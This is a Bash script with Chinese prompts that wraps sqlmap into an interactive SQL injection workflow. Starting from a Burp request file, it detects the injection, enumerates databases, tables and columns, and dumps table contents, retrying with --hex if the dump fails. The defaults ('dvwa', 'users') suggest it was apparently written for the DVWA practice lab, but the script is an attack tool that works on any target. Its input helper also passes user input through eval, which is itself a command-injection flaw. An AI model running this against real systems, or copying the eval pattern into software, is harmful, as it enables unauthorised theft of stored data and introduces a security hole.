#!/bin/bash

# 颜色定义
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# 显示帮助
show_help() {
    echo -e "${YELLOW}用法: $0${NC}"
    echo "交互式 SQLmap 注入脚本"
    echo ""
    echo "流程: 请求文件 -> 检测注入 -> 枚举数据库 -> 选择数据库 -> 枚举表 -> 选择表 -> 枚举字段 -> 导出数据"
    echo -e "${YELLOW}每一步都会询问你是否继续，输入 'q' 可随时退出${NC}"
}

# 询问是否继续
ask_continue() {
    local step_name="$1"
    echo ""
    echo -ne "${YELLOW}[?] 是否继续${step_name}? (y/n/q): ${NC}"
    read -r answer
    case $answer in
        y|Y) return 0 ;;
        n|N) return 1 ;;
        q|Q) echo -e "${RED}用户退出${NC}"; exit 0 ;;
        *) return 1 ;;
    esac
}

# 询问用户输入
ask_input() {
    local prompt="$1"
    local var_name="$2"
    local default="$3"
    
    if [ -n "$default" ]; then
        echo -ne "${GREEN}[?] $prompt (默认: $default): ${NC}"
    else
        echo -ne "${GREEN}[?] $prompt: ${NC}"
    fi
    read -r input
    if [ -z "$input" ] && [ -n "$default" ]; then
        eval $var_name="'$default'"
    else
        eval $var_name="'$input'"
    fi
}

# 检查 sqlmap 是否安装
if ! command -v sqlmap &> /dev/null; then
    echo -e "${RED}[-] sqlmap 未安装，请先安装: sudo apt install sqlmap${NC}"
    exit 1
fi

show_help

# ===== 第1步：获取请求文件 =====
while true; do
    ask_input "请输入 Burp 导出的请求文件路径" REQ_FILE
    if [ -f "$REQ_FILE" ]; then
        echo -e "${GREEN}[+] 文件存在: $REQ_FILE${NC}"
        break
    else
        echo -e "${RED}[-] 文件不存在: $REQ_FILE，请重新输入${NC}"
    fi
done

# ===== 第2步：检测注入点 =====
if ask_continue " 检测注入点"; then
    echo -e "${GREEN}[*] 正在检测注入点...${NC}"
    sqlmap -r "$REQ_FILE" --batch
    echo -e "${GREEN}[+] 检测完成${NC}"
fi

# ===== 第3步：枚举所有数据库 =====
if ask_continue " 枚举所有数据库"; then
    echo -e "${GREEN}[*] 正在枚举数据库...${NC}"
    sqlmap -r "$REQ_FILE" --dbs --batch
    echo -e "${GREEN}[+] 数据库枚举完成${NC}"
fi

# ===== 第4步：输入目标数据库名 =====
ask_input "请输入要测试的数据库名" DB_NAME "dvwa"
echo -e "${GREEN}[+] 目标数据库: $DB_NAME${NC}"

# ===== 第5步：枚举该数据库下的所有表 =====
if ask_continue " 枚举 $DB_NAME 数据库的表"; then
    echo -e "${GREEN}[*] 正在枚举表...${NC}"
    sqlmap -r "$REQ_FILE" -D "$DB_NAME" --tables --batch
    echo -e "${GREEN}[+] 表枚举完成${NC}"
fi

# ===== 第6步：输入目标表名 =====
ask_input "请输入要测试的表名" TABLE_NAME "users"
echo -e "${GREEN}[+] 目标表: $TABLE_NAME${NC}"

# ===== 第7步：枚举该表的所有字段 =====
if ask_continue " 枚举 $DB_NAME.$TABLE_NAME 表的字段"; then
    echo -e "${GREEN}[*] 正在枚举字段...${NC}"
    sqlmap -r "$REQ_FILE" -D "$DB_NAME" -T "$TABLE_NAME" --columns --batch
    echo -e "${GREEN}[+] 字段枚举完成${NC}"
fi

# ===== 第8步：导出数据 =====
if ask_continue " 导出 $DB_NAME.$TABLE_NAME 表的数据"; then
    echo -e "${YELLOW}[!] 导出数据可能耗时较长，请耐心等待...${NC}"
    sqlmap -r "$REQ_FILE" -D "$DB_NAME" -T "$TABLE_NAME" --dump --batch
    
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[+] 数据导出成功！${NC}"
    else
        echo -e "${RED}[-] 数据导出失败，可能是编码问题，尝试添加 --hex 参数${NC}"
        ask_input "是否用 --hex 重试? (y/n)" RETRY
        if [[ "$RETRY" =~ ^[Yy]$ ]]; then
            sqlmap -r "$REQ_FILE" -D "$DB_NAME" -T "$TABLE_NAME" --dump --hex --batch
        fi
    fi
fi

echo -e "${GREEN}[+] 所有任务完成！${NC}"